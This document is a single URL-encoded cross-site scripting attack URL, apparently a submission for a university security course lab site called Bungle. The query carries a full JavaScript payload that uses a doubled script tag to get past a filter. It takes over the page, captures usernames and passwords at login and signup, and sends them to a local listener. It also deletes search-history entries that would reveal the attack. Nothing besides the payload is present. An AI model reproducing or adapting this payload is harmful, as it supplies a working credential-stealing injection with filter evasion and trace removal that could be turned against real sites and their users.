http://bungle-cs461.cs.illinois.edu/./search?xssdefense=1&q=%3Cscrscriptipt%3Efunction%20payload(attacker)%20%7B%0A%20%20%20%20function%20log(data)%20%7B%0A%20%20%20%20%20%20%20%20console.log(%24.param(data))%0A%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%20%20%7D%0A%20%20%20%20var%20user_login%3D%22%22%3B%0A%20%20%20%20var%20count%3D0%3B%0A%20%20%20%20%0A%20%20%20%20function%20proxy(href)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24(%22html%22).load(href%2C%20function()%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22html%22).show()%3B%0A%0A%20%20%20%20%20%20%20%20%20%20window.onpopstate%20%3D%20function(event)%20%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(location.href.split(%22.edu%22)%5B1%5D)%20%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2Fproxy(href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%7D%2F%2Fproxy%20popstate%20%20event%20activate!%20%0A%20%20%20%20%20%20%20%20%20%20%20if%20(count%3D%3D0)%20history.replaceState(null%2C%20null%2C%20href)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20user_login%3D%24(%22%23logged-in-user%22).text()%3B%2F%2F%20get%20the%20current%20user%20who%20has%20logged%20in!%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22nav%22%2Cuser%3Auser_login%2Curl%3Alocation.href%7D)%3B%2F%2Fspy%20and%20send%20it%20back%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23query%22).val(%22%22)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23search-again-btn%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20history.pushState(null%2C%20null%2C%20%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%22.%2F%22)%3B%2F%2F%20proxy%20for%20new%20load%20pages%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23bungle-lnk%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20history.pushState(null%2C%20null%2C%20%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23search-btn%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20query%3D%24(%22%23query%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20history.pushState(href%2C%20null%2C%20%22search%3Fq%3D%22%2Bquery)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%22.%2Fsearch%3Fq%3D%22%2Bquery)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22.history-item%22).removeAttr(%22href%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.each(%24(%22.history-item%22)%2C%20function()%20%7B%0A%20%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24(this).text().includes(%22payload(attacker)%22)%20%7C%7C%20%24(this).text().includes(%22fromCharCode(102%22))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24(this).remove()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2Fconsole.log(111)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D)%3B%2F%2Fremove%20history%20related%20to%20the%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23log-in-btn%22).click(function(e)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%2F%2Fquite%20important%0A%20%20%20%20%20%20%20%20%20%20%20%20%20var%20user%3D%24(%22%23username%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20var%20pwd%3D%24(%22%23userpass%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%24.post(%22.%2Flogin%22%2C%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20username%3A%20user%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20password%3A%20pwd%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2Ffunction%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20user_login%3Duser%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22login%22%2C%20username%3Auser%2C%20password%3Apwd%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%2F%2Flogin%20button*%2F%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23new-account-btn%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%2F%2Fquite%20important%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20user%3D%24(%22%23username%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20pwd%3D%24(%22%23userpass%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.post(%22.%2Fcreate%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20username%3A%20user%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20password%3A%20pwd%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20user_login%3Duser%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22create%20new%20user%22%2Cusername%3Auser%2Cpassword%3Apwd%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%2F%2Fcreate-new-user%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23log-out-btn%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.post(%22.%2Flogout%22%2Cfunction(e)%7B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(%22.%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20history.pushState(null%2C%20null%2C%20href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22logout%22%2C%20user%3A%20user_login%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%2F%2Fend%20of%20load%20function%0A%20%20%20%20%20%20%20%7D%0A%20%20%20%20%24(%22html%22).hide()%3B%0A%20%20%20%20proxy(%22.%2F%22)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%3C%2Fscrscriptipt%3E